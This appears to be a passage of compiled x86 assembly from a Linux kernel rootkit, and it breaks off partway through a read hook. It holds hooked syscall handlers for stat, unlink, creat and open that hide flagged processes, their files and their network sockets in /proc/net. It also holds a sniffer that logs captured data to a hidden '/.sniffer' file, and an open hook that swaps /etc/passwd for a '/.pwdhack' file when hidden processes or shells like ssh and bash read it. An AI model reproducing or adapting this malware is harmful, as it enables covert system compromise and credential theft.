	movl	%esi, %ecx
	movl	%ebx, %edi
	movl	%esi, %eax
#APP
	decl %ecx
	repnz; scasb
	notl %ecx
	decl %ecx
	
#NO_APP
	subl	$12, %esp
	leal	1088(%ecx), %eax
	pushl	%eax
	movl	%ecx, %ebp
	call	ualloc
	movl	%eax, 20(%esp)
	addl	$16, %esp
	movl	4(%esp), %esi
	testl	%esi, %esi
	movl	$-12, %eax
	je	.L457
	movl	4(%esp), %edx
	addl	$64, %edx
	movl	%ebp, %ecx
	movl	%ebx, %esi
	movl	%edx, %edi
#APP
	rep; movsb
#NO_APP
	leal	(%ebp,%edx), %edi
	movl	$cfg+256, %esi
#APP
	1:	lodsb
	stosb
	testb %al, %al
	jne 1b
	
#NO_APP
	pushl	%ebx
	pushl	8(%esp)
	pushl	%edx
	pushl	$106
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%eax, %eax
	js	.L470
	cmpl	$-1, 36(%esp)
	je	.L468
	movl	4(%esp), %edx
	movl	20(%edx), %eax
	movl	8(%esp), %ecx
	movl	36(%esp), %edx
	movl	%eax, (%edx,%ecx)
.L468:
	cmpl	$-1, 40(%esp)
	je	.L469
	movl	4(%esp), %ecx
	movl	24(%ecx), %eax
	movl	8(%esp), %edx
	movl	40(%esp), %ecx
	movl	%eax, (%ecx,%edx)
.L469:
	cmpl	$-1, 44(%esp)
	je	.L470
	movl	4(%esp), %edx
	movl	28(%edx), %eax
	movl	8(%esp), %ecx
	movl	44(%esp), %edx
	movl	%eax, (%edx,%ecx)
.L470:
	subl	$12, %esp
	pushl	16(%esp)
	call	ufree
	xorl	%eax, %eax
	addl	$16, %esp
	jmp	.L457
.Lfe44:
	.size	do_stat,.Lfe44-do_stat
	.local	dummy.3
.globl 	dummy.3;	dummy.3:.zero 30 
	.type	new_oldstat,@function
new_oldstat:
	subl	$12, %esp
	pushl	$-1
	pushl	$-1
	pushl	$14
	leal	28(%esp), %eax
	pushl	%eax
	call	do_stat
	addl	$28, %esp
	ret
.Lfe45:
	.size	new_oldstat,.Lfe45-new_oldstat
	.local	dummy.4
.globl 	dummy.4;	dummy.4:.zero 64 
	.type	new_stat,@function
new_stat:
	subl	$12, %esp
	pushl	$28
	pushl	$24
	pushl	$20
	leal	28(%esp), %eax
	pushl	%eax
	call	do_stat
	addl	$28, %esp
	ret
.Lfe46:
	.size	new_stat,.Lfe46-new_stat
	.local	dummy.5
.globl 	dummy.5;	dummy.5:.zero 96 
	.type	new_stat64,@function
new_stat64:
	subl	$12, %esp
	pushl	$56
	pushl	$52
	pushl	$44
	leal	28(%esp), %eax
	pushl	%eax
	call	do_stat
	addl	$28, %esp
	ret
.Lfe47:
	.size	new_stat64,.Lfe47-new_stat64
	.data
	.type	bdev,@object
	.size	bdev,4
bdev:
	.long	-1
	.type	bad,@object
	.size	bad,16
bad:
	.long	-1
	.long	-1
	.long	-1
	.long	-1
.LC15:
	.string	"/proc/net/tcp"
.LC16:
	.string	"/proc/net/udp"
.LC17:
	.string	"/proc/net/raw"
.LC18:
	.string	"/proc/net/unix"
	.data
	.type	badlist,@object
	.size	badlist,16
badlist:
	.long	.LC15
	.long	.LC16
	.long	.LC17
	.long	.LC18
	.type	cache_bads,@function
cache_bads:
	pushl	%esi
	pushl	%ebx
	subl	$68, %esp
	movl	$-8192, %eax
#APP
	andl %esp,%eax; 
#NO_APP
	movl	12(%eax), %esi
	xorl	%ebx, %ebx
	movl	$-1, 12(%eax)
.L485:
	cmpl	$-1, bad(,%ebx,4)
	je	.L490
.L481:
	incl	%ebx
	cmpl	$3, %ebx
	jle	.L485
	movl	$-8192, %eax
#APP
	andl %esp,%eax; 
#NO_APP
	movl	%esi, 12(%eax)
	addl	$68, %esp
	popl	%ebx
	popl	%esi
	ret
.L490:
	pushl	%eax
	leal	4(%esp), %eax
	pushl	%eax
	pushl	badlist(,%ebx,4)
	pushl	$106
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%eax, %eax
	jne	.L481
	movl	4(%esp), %eax
	movl	%eax, bad(,%ebx,4)
	movzwl	(%esp), %eax
	movl	%eax, bdev
	jmp	.L481
.Lfe48:
	.size	cache_bads,.Lfe48-cache_bads
.LC19:
	.string	"/proc/"
.LC20:
	.string	"/fd"
.LC21:
	.string	"socket:["
	.type	create_net_tab,@function
create_net_tab:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$364, %esp
	movl	$-8192, %eax
#APP
	andl %esp,%eax; 
#NO_APP
	movl	12(%eax), %edx
	movl	$0, 4(%esp)
	movl	%edx, (%esp)
	movl	$-1, 12(%eax)
	movl	$0, 12(%esp)
.L514:
	xorl	%eax, %eax
	cmpl	$32767, 12(%esp)
	ja	.L501
	movl	12(%esp), %ecx
	andl	$31, %ecx
	movl	12(%esp), %edx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$5, %edx
	testl	%eax, pidtab(,%edx,4)
	setne	%al
	movzbl	%al, %eax
.L501:
	testl	%eax, %eax
	jne	.L518
.L497:
	incl	12(%esp)
	cmpl	$32767, 12(%esp)
	jle	.L514
.L513:
	movl	(%esp), %edx
	movl	$-8192, %eax
#APP
	andl %esp,%eax; 
#NO_APP
	movl	%edx, 12(%eax)
	movl	4(%esp), %eax
	addl	$364, %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
.L518:
	movl	$.LC19, %esi
	leal	320(%esp), %edi
#APP
	1:	lodsb
	stosb
	testb %al, %al
	jne 1b
	
#NO_APP
	subl	$8, %esp
	pushl	20(%esp)
	leal	338(%esp), %eax
	pushl	%eax
	call	my_itoa
	leal	336(%esp), %ebp
	addl	%eax, %ebp
	leal	6(%ebp), %ebx
	addl	$16, %esp
	movl	$.LC20, %esi
	movl	%ebx, %edi
#APP
	1:	lodsb
	stosb
	testb %al, %al
	jne 1b
	
#NO_APP
	pushl	$0
	pushl	$0
	leal	328(%esp), %ecx
	pushl	%ecx
	pushl	$5
	call __do_syscall;push %eax
	movl	%eax, 24(%esp)
	addl	$16, %esp
	testl	%eax, %eax
	js	.L497
	movb	$47, 9(%ebp)
	leal	10(%ebp), %ebx
.L505:
	pushl	$266
	leal	20(%esp), %eax
	pushl	%eax
	pushl	16(%esp)
	pushl	$89
	call __do_syscall;push %eax
	addl	$16, %esp
	decl	%eax
	jne	.L507
	leal	26(%esp), %esi
	movl	%ebx, %edi
#APP
	1:	lodsb
	stosb
	testb %al, %al
	jne 1b
	
#NO_APP
	pushl	$32
	leal	292(%esp), %ebp
	pushl	%ebp
	leal	328(%esp), %edx
	pushl	%edx
	pushl	$85
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%eax, %eax
	jle	.L505
	movb	$0, 288(%esp,%eax)
	movl	$.LC21, %edi
	movl	$8, %ecx
	movl	%ebp, %esi
#APP
	1:	decl %ecx
	js 2f
	lodsb
	scasb
	jne 3f
	testb %al,%al
	jne 1b
2:	xorl %eax,%eax
	jmp 4f
3:	sbbl %eax,%eax
	orb $1,%al
4:
#NO_APP
	testl	%eax, %eax
	jne	.L505
	subl	$12, %esp
	pushl	%ebp
	call	my_atoi
	movl	20(%esp), %ecx
	movl	400(%esp), %edx
	movl	%eax, (%edx,%ecx,4)
	incl	%ecx
	movl	%ecx, 20(%esp)
	addl	$16, %esp
	movl	388(%esp), %eax
	cmpl	%eax, %ecx
	jl	.L505
	subl	$8, %esp
	pushl	16(%esp)
	pushl	$6
	call __do_syscall;push %eax
	addl	$16, %esp
	jmp	.L513
.L507:
	subl	$8, %esp
	pushl	16(%esp)
	pushl	$6
	call __do_syscall;push %eax
	addl	$16, %esp
	jmp	.L497
.Lfe49:
	.size	create_net_tab,.Lfe49-create_net_tab
	.type	strip_net,@function
strip_net:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$28, %esp
	movl	48(%esp), %esi
	movl	56(%esp), %eax
	addl	%esi, %eax
	movl	52(%esp), %ebp
	movl	%esi, %ebx
	movl	$0, 24(%esp)
	movl	%eax, 12(%esp)
.L520:
	cmpl	12(%esp), %ebx
	jae	.L522
	movl	%ebx, %eax
	subl	%esi, %eax
	testl	%eax, %eax
	jle	.L523
	movl	%eax, %ecx
	movl	%ebp, %edi
#APP
	rep; movsb
#NO_APP
	addl	%eax, %ebp
	addl	%eax, 24(%esp)
.L523:
	xorl	%ecx, %ecx
	cmpl	68(%esp), %ecx
	movl	%ebx, %esi
	jge	.L559
	movb	(%ebx), %al
.L542:
	cmpb	$32, %al
	movb	%al, %dl
	je	.L534
.L540:
	cmpl	12(%esp), %ebx
	jae	.L522
	cmpb	$10, %al
	je	.L520
	incl	%ebx
	movb	(%ebx), %al
	cmpb	$32, %al
	jne	.L540
	cmpl	12(%esp), %ebx
	jae	.L522
	incl	%ecx
	cmpl	68(%esp), %ecx
	jl	.L542
.L559:
	subl	$12, %esp
	pushl	%ebx
	call	my_atoi2
	addl	$16, %esp
	cmpb	$10, (%ebx)
	je	.L565
.L547:
	incl	%ebx
	cmpl	12(%esp), %ebx
	jae	.L522
	cmpb	$10, (%ebx)
	jne	.L547
.L565:
	incl	%ebx
	testl	%eax, %eax
	je	.L520
	xorl	%edx, %edx
	cmpl	64(%esp), %edx
	jge	.L567
.L555:
	movl	60(%esp), %ecx
	cmpl	%eax, (%ecx,%edx,4)
	je	.L568
	incl	%edx
	cmpl	64(%esp), %edx
	jl	.L555
.L567:
	xorl	%eax, %eax
.L554:
	testl	%eax, %eax
	je	.L520
	movl	%ebx, %esi
	jmp	.L520
.L568:
	movl	$1, %eax
	jmp	.L554
.L522:
	movl	%ebx, %eax
	subl	%esi, %eax
	testl	%eax, %eax
	jle	.L556
	movl	%eax, %ecx
	movl	%ebp, %edi
#APP
	rep; movsb
#NO_APP
	addl	%eax, 24(%esp)
.L556:
	movl	24(%esp), %eax
	addl	$28, %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
.L534:
	cmpl	12(%esp), %ebx
	jae	.L522
	cmpb	$10, %dl
	je	.L520
	incl	%ebx
	movb	(%ebx), %al
	cmpb	$32, %al
	movb	%al, %dl
	je	.L534
	jmp	.L540
.Lfe50:
	.size	strip_net,.Lfe50-strip_net
	.type	hide_sockets,@function
hide_sockets:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$24, %esp
	movl	44(%esp), %ebp
	pushl	$16384
	call	ualloc
	movl	%eax, %esi
	xorl	%edi, %edi
	addl	$16, %esp
	testl	%esi, %esi
	movl	$1, %eax
	je	.L569
.L571:
	pushl	$16384
	pushl	%esi
	pushl	%ebp
	pushl	$3
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%eax, %eax
	js	.L575
	addl	%eax, %edi
	cmpl	$16384, %eax
	je	.L571
	pushl	$0
	pushl	$0
	pushl	%ebp
	pushl	$19
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%eax, %eax
	je	.L589
.L575:
	subl	$12, %esp
	pushl	%esi
	call	ufree
	movl	$1, %eax
	addl	$16, %esp
.L569:
	addl	$12, %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
.L589:
	subl	$12, %esp
	pushl	%edi
	call	ualloc
	movl	%eax, 20(%esp)
	addl	$16, %esp
	testl	%eax, %eax
	je	.L575
	subl	$12, %esp
	leal	13(%edi), %eax
	pushl	%eax
	call	ualloc
	movl	%eax, 16(%esp)
	addl	$16, %esp
	testl	%eax, %eax
	je	.L580
	subl	$8, %esp
	pushl	$4096
	pushl	%esi
	call	create_net_tab
	movl	%eax, 24(%esp)
	addl	$16, %esp
	pushl	%edi
	pushl	8(%esp)
	pushl	%ebp
	pushl	$3
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%eax, %eax
	movl	%eax, %ebx
	js	.L583
	pushl	$0
	pushl	$0
	pushl	%ebp
	pushl	$19
	call __do_syscall;push %eax
	popl	%eax
	popl	%edx
	xorl	%eax, %eax
	cmpl	$3, 44(%esp)
	setne	%al
	leal	6(%eax,%eax,2), %eax
	pushl	%eax
	pushl	20(%esp)
	pushl	%esi
	pushl	%ebx
	movl	24(%esp), %eax
	addl	$12, %eax
	pushl	%eax
	pushl	32(%esp)
	call	strip_net
	movl	32(%esp), %edx
	movl	%eax, 4(%edx)
	addl	$24, %esp
	movl	$-8192, %eax
#APP
	andl %esp,%eax; 
#NO_APP
	movl	$0, 8(%edx)
	movl	%ebp, (%edx)
	movl	%edx, 2044(%eax)
	pushl	$0
	pushl	$20
	call __do_syscall;push %eax
	addl	$16, %esp
	cmpl	$32767, %eax
	movl	%eax, %edx
	ja	.L588
	movl	%eax, %ecx
	andl	$31, %ecx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$5, %edx
	orl	%eax, nettab(,%edx,4)
.L588:
	xorl	%eax, %eax
	jmp	.L569
.L583:
	subl	$12, %esp
	pushl	12(%esp)
	call	ufree
	addl	$16, %esp
.L580:
	subl	$12, %esp
	pushl	16(%esp)
	call	ufree
	addl	$16, %esp
	jmp	.L575
.Lfe51:
	.size	hide_sockets,.Lfe51-hide_sockets
	.type	new_unlink,@function
new_unlink:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$1188, %esp
	pushl	$0
	pushl	$20
	call __do_syscall;push %eax
	movl	%eax, %edx
	addl	$16, %esp
	xorl	%eax, %eax
	cmpl	$32767, %edx
	ja	.L593
	movl	%edx, %ecx
	andl	$31, %ecx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$5, %edx
	testl	%eax, pidtab(,%edx,4)
	setne	%al
	movzbl	%al, %eax
.L593:
	testl	%eax, %eax
	movl	$-200, %edx
	je	.L607
.L590:
	addl	$1180, %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	movl	%edx, %eax
	popl	%ebp
	ret
.L607:
	subl	$12, %esp
	pushl	1212(%esp)
	call	check_path
	addl	$16, %esp
	testl	%eax, %eax
	movl	$-2, %edx
	jne	.L590
	pushl	%ebx
	pushl	$0
	pushl	1208(%esp)
	pushl	$33
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%eax, %eax
	jne	.L595
	movl	%eax, %ecx
	movl	1200(%esp), %edi
#APP
	decl %ecx
	repnz; scasb
	notl %ecx
	decl %ecx
	
#NO_APP
	cmpl	$1023, %ecx
	movl	%ecx, %edx
	jle	.L608
.L595:
	movl	$-200, %edx
	jmp	.L590
.L608:
	movl	$-8192, %ebx
#APP
	andl %esp,%ebx; 
#NO_APP
	movl	12(%ebx), %ebp
	movl	1200(%esp), %esi
	movl	$-1, 12(%ebx)
	leal	80(%esp), %edi
#APP
	rep; movsb
#NO_APP
	leal	80(%esp), %eax
	leal	(%edx,%eax), %edx
	movl	$cfg+256, %esi
	movl	%edx, %edi
#APP
	1:	lodsb
	stosb
	testb %al, %al
	jne 1b
	
#NO_APP
	pushl	%ecx
	pushl	$0
	leal	88(%esp), %eax
	pushl	%eax
	pushl	$33
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%eax, %eax
	jne	.L602
	movl	$-26, %edx
	movl	%ebp, 12(%ebx)
	jmp	.L590
.L602:
	movl	%ebp, 12(%ebx)
	jmp	.L595
.Lfe52:
	.size	new_unlink,.Lfe52-new_unlink
	.type	new_creat,@function
new_creat:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$1188, %esp
	pushl	$0
	pushl	$20
	call __do_syscall;push %eax
	movl	%eax, %edx
	addl	$16, %esp
	xorl	%eax, %eax
	cmpl	$32767, %edx
	ja	.L612
	movl	%edx, %ecx
	andl	$31, %ecx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$5, %edx
	testl	%eax, pidtab(,%edx,4)
	setne	%al
	movzbl	%al, %eax
.L612:
	testl	%eax, %eax
	movl	$-200, %edx
	je	.L626
.L609:
	addl	$1180, %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	movl	%edx, %eax
	popl	%ebp
	ret
.L626:
	subl	$12, %esp
	pushl	1212(%esp)
	call	check_path
	addl	$16, %esp
	testl	%eax, %eax
	movl	$-2, %edx
	jne	.L609
	pushl	%eax
	pushl	$0
	pushl	1208(%esp)
	pushl	$33
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%eax, %eax
	jne	.L614
	movl	%eax, %ecx
	movl	1200(%esp), %edi
#APP
	decl %ecx
	repnz; scasb
	notl %ecx
	decl %ecx
	
#NO_APP
	cmpl	$1023, %ecx
	movl	%ecx, %edx
	jle	.L627
.L614:
	movl	$-200, %edx
	jmp	.L609
.L627:
	movl	$-8192, %ebp
#APP
	andl %esp,%ebp; 
#NO_APP
	movl	12(%ebp), %eax
	leal	80(%esp), %ebx
	movl	%eax, 8(%esp)
	movl	$-1, 12(%ebp)
	movl	1200(%esp), %esi
	movl	%ebx, %edi
#APP
	rep; movsb
#NO_APP
	leal	(%edx,%ebx), %eax
	movl	$cfg+256, %esi
	movl	%eax, %edi
#APP
	1:	lodsb
	stosb
	testb %al, %al
	jne 1b
	
#NO_APP
	pushl	%eax
	pushl	$0
	pushl	%ebx
	pushl	$33
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%eax, %eax
	je	.L628
.L621:
	movl	$-8192, %eax
	movl	8(%esp), %ecx
#APP
	andl %esp,%eax; 
#NO_APP
	movl	%ecx, 12(%eax)
	jmp	.L614
.L628:
	pushl	%edi
	leal	20(%esp), %eax
	pushl	%eax
	pushl	%ebx
	pushl	$99
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%eax, %eax
	jne	.L621
	cmpl	$8, 48(%esp)
	jle	.L621
	pushl	%esi
	pushl	1208(%esp)
	pushl	%ebx
	pushl	$8
	call __do_syscall;push %eax
	addl	$16, %esp
	movl	8(%esp), %edx
	movl	%edx, 12(%ebp)
	movl	%eax, %edx
	jmp	.L609
.Lfe53:
	.size	new_creat,.Lfe53-new_creat
.LC22:
	.string	"/etc/passwd"
.LC23:
	.string	"/stat"
.LC24:
	.string	"(ssh)"
.LC25:
	.string	"(ssh2)"
.LC26:
	.string	"(scp)"
.LC27:
	.string	"(ncftp)"
.LC28:
	.string	"(screen"
.LC29:
	.string	"(sh)"
.LC30:
	.string	"(bash)"
.LC31:
	.string	"/.pwdhack"
	.type	new_open,@function
new_open:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$1444, %esp
	movl	1464(%esp), %ebx
	pushl	$0
	pushl	$20
	call __do_syscall;push %eax
	movl	%eax, %edx
	addl	$16, %esp
	xorl	%eax, %eax
	cmpl	$32767, %edx
	ja	.L632
	movl	%edx, %ecx
	andl	$31, %ecx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$5, %edx
	testl	%eax, pidtab(,%edx,4)
	setne	%al
	movzbl	%al, %eax
.L632:
	testl	%eax, %eax
	je	.L630
	pushl	1464(%esp)
	pushl	1464(%esp)
	pushl	%ebx
	pushl	$5
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%eax, %eax
	movl	%eax, %ebp
	movl	%eax, %edx
	js	.L629
	movl	$.LC22, %edi
	movl	%ebx, %esi
#APP
	1:	lodsb
	scasb
	jne 2f
	testb %al,%al
	jne 1b
	xorl %eax,%eax
	jmp 3f
2:	sbbl %eax,%eax
	orb $1,%al
3:
#NO_APP
	testl	%eax, %eax
	je	.L697
.L696:
	movl	%ebp, %edx
.L629:
	addl	$1436, %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	movl	%edx, %eax
	popl	%ebp
	ret
.L697:
	movl	$cfg, %edi
	movl	%eax, %ecx
#APP
	decl %ecx
	repnz; scasb
	notl %ecx
	decl %ecx
	
#NO_APP
	movl	%ecx, 8(%esp)
	cld
	leal	16(%esp), %edi
	movl	$.LC19, %esi
	movl	$1, %ecx
	rep
	movsl
	movsw
	movsb
	leal	23(%esp), %eax
	pushl	%edx
	pushl	$249
	pushl	$0
	pushl	%eax
	call	memset
	popl	%esi
	movl	$-8192, %eax
#APP
	andl %esp,%eax; 
#NO_APP
	popl	%edi
	movl	12(%eax), %edx
	movl	%edx, 12(%esp)
	movl	$-1, 12(%eax)
	pushl	$0
	pushl	$20
	call __do_syscall;push %eax
	popl	%ecx
	popl	%ebx
	pushl	%eax
	leal	34(%esp), %eax
	pushl	%eax
	call	my_itoa
	leal	38(%esp,%eax), %edx
	movl	$.LC23, %esi
	addl	$16, %esp
	movl	%edx, %edi
#APP
	1:	lodsb
	stosb
	testb %al, %al
	jne 1b
	
#NO_APP
	pushl	$0
	pushl	$0
	leal	24(%esp), %ecx
	pushl	%ecx
	pushl	$5
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%eax, %eax
	movl	%eax, %ebx
	js	.L642
	pushl	$255
	leal	20(%esp), %eax
	pushl	%eax
	pushl	%ebx
	pushl	$3
	call __do_syscall;push %eax
	movl	%eax, %esi
	popl	%eax
	popl	%edx
	pushl	%ebx
	pushl	$6
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%esi, %esi
	js	.L642
	movb	$0, 16(%esp,%esi)
	cmpb	$40, 16(%esp)
	leal	16(%esp), %edx
	je	.L693
.L648:
	incl	%edx
	cmpb	$40, (%edx)
	jne	.L648
.L693:
	movl	$5, %ebx
	movl	$.LC24, %edi
	movl	%edx, %esi
	movl	%ebx, %ecx
#APP
	1:	decl %ecx
	js 2f
	lodsb
	scasb
	jne 3f
	testb %al,%al
	jne 1b
2:	xorl %eax,%eax
	jmp 4f
3:	sbbl %eax,%eax
	orb $1,%al
4:
#NO_APP
	testl	%eax, %eax
	je	.L650
	movl	$.LC25, %edi
	movl	%edx, %esi
	movl	$6, %ecx
#APP
	1:	decl %ecx
	js 2f
	lodsb
	scasb
	jne 3f
	testb %al,%al
	jne 1b
2:	xorl %eax,%eax
	jmp 4f
3:	sbbl %eax,%eax
	orb $1,%al
4:
#NO_APP
	testl	%eax, %eax
	je	.L650
	movl	$.LC26, %edi
	movl	%edx, %esi
	movl	%ebx, %ecx
#APP
	1:	decl %ecx
	js 2f
	lodsb
	scasb
	jne 3f
	testb %al,%al
	jne 1b
2:	xorl %eax,%eax
	jmp 4f
3:	sbbl %eax,%eax
	orb $1,%al
4:
#NO_APP
	testl	%eax, %eax
	je	.L650
	movl	$7, %ebx
	movl	$.LC27, %edi
	movl	%edx, %esi
	movl	%ebx, %ecx
#APP
	1:	decl %ecx
	js 2f
	lodsb
	scasb
	jne 3f
	testb %al,%al
	jne 1b
2:	xorl %eax,%eax
	jmp 4f
3:	sbbl %eax,%eax
	orb $1,%al
4:
#NO_APP
	testl	%eax, %eax
	je	.L650
	movl	$.LC28, %edi
	movl	%edx, %esi
	movl	%ebx, %ecx
#APP
	1:	decl %ecx
	js 2f
	lodsb
	scasb
	jne 3f
	testb %al,%al
	jne 1b
2:	xorl %eax,%eax
	jmp 4f
3:	sbbl %eax,%eax
	orb $1,%al
4:
#NO_APP
	testl	%eax, %eax
	je	.L650
	movl	$.LC29, %edi
	movl	$4, %ecx
	movl	%edx, %esi
#APP
	1:	decl %ecx
	js 2f
	lodsb
	scasb
	jne 3f
	testb %al,%al
	jne 1b
2:	xorl %eax,%eax
	jmp 4f
3:	sbbl %eax,%eax
	orb $1,%al
4:
#NO_APP
	testl	%eax, %eax
	je	.L650
	movl	$.LC30, %edi
	movl	%edx, %esi
	movl	$6, %ecx
#APP
	1:	decl %ecx
	js 2f
	lodsb
	scasb
	jne 3f
	testb %al,%al
	jne 1b
2:	xorl %eax,%eax
	jmp 4f
3:	sbbl %eax,%eax
	orb $1,%al
4:
#NO_APP
	testl	%eax, %eax
	jne	.L642
.L650:
	movl	$cfg, %esi
	movl	8(%esp), %ecx
	leal	16(%esp), %edi
#APP
	rep; movsb
#NO_APP
	leal	16(%esp), %edi
	addl	8(%esp), %edi
	movl	$.LC31, %esi
#APP
	1:	lodsb
	stosb
	testb %al, %al
	jne 1b
	
#NO_APP
	pushl	1464(%esp)
	pushl	1464(%esp)
	leal	24(%esp), %edx
	pushl	%edx
	pushl	$5
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%eax, %eax
	js	.L642
	movl	%eax, %ebp
.L642:
	movl	$-8192, %eax
	movl	4(%esp), %ecx
#APP
	andl %esp,%eax; 
#NO_APP
	movl	%ecx, 12(%eax)
	jmp	.L696
.L630:
	subl	$12, %esp
	pushl	%ebx
	call	check_path
	addl	$16, %esp
	testl	%eax, %eax
	movl	$-2, %edx
	jne	.L629
	pushl	%eax
	pushl	$0
	pushl	%ebx
	pushl	$33
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%eax, %eax
	jne	.L664
	movl	%eax, %ecx
	movl	%ebx, %edi
#APP
	decl %ecx
	repnz; scasb
	notl %ecx
	decl %ecx
	
#NO_APP
	cmpl	$1023, %ecx
	movl	%ecx, %edx
	jle	.L698
.L664:
	pushl	1464(%esp)
	pushl	1464(%esp)
	pushl	%ebx
	pushl	$5
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%eax, %eax
	movl	%eax, %ebp
	movl	%eax, %edx
	js	.L629
	movl	$-8192, %ebx
#APP
	andl %esp,%ebx; 
#NO_APP
	movl	12(%ebx), %esi
	movl	$-1, 12(%ebx)
	call	cache_bads
	pushl	%eax
	leal	1364(%esp), %eax
	pushl	%eax
	pushl	%ebp
	pushl	$108
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%eax, %eax
	jne	.L680
	movzwl	1360(%esp), %eax
	cmpl	bdev, %eax
	je	.L699
.L680:
	movl	$-8192, %eax
#APP
	andl %esp,%eax; 
#NO_APP
	movl	%esi, 12(%eax)
	jmp	.L696
.L699:
	xorl	%edx, %edx
	movl	1364(%esp), %eax
	movl	%ebx, %ecx
.L689:
	cmpl	%eax, bad(,%edx,4)
	je	.L700
	incl	%edx
	cmpl	$3, %edx
	jle	.L689
	jmp	.L680
.L700:
	subl	$8, %esp
	movl	%esi, 12(%ecx)
	pushl	%edx
	pushl	%ebp
	call	hide_sockets
	addl	$16, %esp
	testl	%eax, %eax
	movl	%ebp, %edx
	je	.L629
	subl	$8, %esp
	pushl	%ebp
	pushl	$6
	call __do_syscall;push %eax
	movl	$-12, %edx
	addl	$16, %esp
	jmp	.L629
.L698:
	movl	$-8192, %eax
#APP
	andl %esp,%eax; 
#NO_APP
	movl	%eax, (%esp)
	movl	(%esp), %ecx
	movl	12(%eax), %eax
	leal	272(%esp), %ebp
	movl	$-1, 12(%ecx)
	movl	%eax, 12(%esp)
	movl	%edx, %ecx
	movl	%ebx, %esi
	movl	%ebp, %edi
#APP
	rep; movsb
#NO_APP
	leal	(%edx,%ebp), %edi
	movl	$cfg+256, %esi
#APP
	1:	lodsb
	stosb
	testb %al, %al
	jne 1b
	
#NO_APP
	pushl	%eax
	pushl	$0
	pushl	%ebp
	pushl	$33
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%eax, %eax
	je	.L701
	movl	12(%esp), %edx
	movl	(%esp), %eax
	movl	%edx, 12(%eax)
	jmp	.L664
.L701:
	pushl	1464(%esp)
	pushl	1464(%esp)
	pushl	%ebp
	pushl	$5
	call __do_syscall;push %eax
	addl	$16, %esp
	movl	%eax, %edx
	movl	12(%esp), %ecx
	movl	(%esp), %eax
	movl	%ecx, 12(%eax)
	jmp	.L629
.Lfe54:
	.size	new_open,.Lfe54-new_open
	.type	is_a_tty,@function
is_a_tty:
	pushl	%esi
	pushl	%ebx
	pushl	%ecx
	movl	%esp, %eax
	movl	$-8192, %ebx
#APP
	andl %esp,%ebx; 
#NO_APP
	movl	12(%ebx), %esi
	movl	$-1, 12(%ebx)
	pushl	%eax
	pushl	$21519
	pushl	24(%esp)
	pushl	$54
	call __do_syscall;push %eax
	movl	%esi, 12(%ebx)
	addl	$20, %esp
	notl	%eax
	popl	%ebx
	shrl	$31, %eax
	popl	%esi
	ret
.Lfe55:
	.size	is_a_tty,.Lfe55-is_a_tty
.LC32:
	.string	"/.sniffer"
	.type	snifflog,@function
snifflog:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	movl	$cfg, %edx
	xorl	%ecx, %ecx
	subl	$300, %esp
	movl	%edx, %edi
	movl	%ecx, %eax
#APP
	decl %ecx
	repnz; scasb
	notl %ecx
	decl %ecx
	
#NO_APP
	leal	32(%esp), %ebx
	movl	%ecx, %ebp
	movl	%edx, %esi
	movl	%ebx, %edi
#APP
	rep; movsb
#NO_APP
	leal	(%ebp,%ebx), %edi
	movl	$.LC32, %esi
#APP
	1:	lodsb
	stosb
	testb %al, %al
	jne 1b
	
#NO_APP
	subl	$8, %esp
	pushl	$0
	pushl	$60
	call __do_syscall;push %eax
	movl	$-8192, %edi
	addl	$16, %esp
#APP
	andl %esp,%edi; 
#NO_APP
	movl	12(%edi), %ebp
	movl	$-1, 12(%edi)
	pushl	$146
	pushl	$1089
	pushl	%ebx
	pushl	$5
	movl	%eax, %esi
	call __do_syscall;push %eax
	movl	%eax, %ebx
	popl	%eax
	popl	%edx
	pushl	%esi
	pushl	$60
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%ebx, %ebx
	js	.L716
	pushl	324(%esp)
	pushl	324(%esp)
	pushl	%ebx
	pushl	$4
	call __do_syscall;push %eax
	popl	%esi
	popl	%eax
	pushl	%ebx
	pushl	$6
	call __do_syscall;push %eax
	addl	$16, %esp
.L716:
	movl	%ebp, 12(%edi)
	addl	$300, %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
.Lfe56:
	.size	snifflog,.Lfe56-snifflog
	.type	new_read,@function
new_read:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$100, %esp
	movl	128(%esp), %ebx
	pushl	$0
	pushl	$20
	call __do_syscall;push %eax
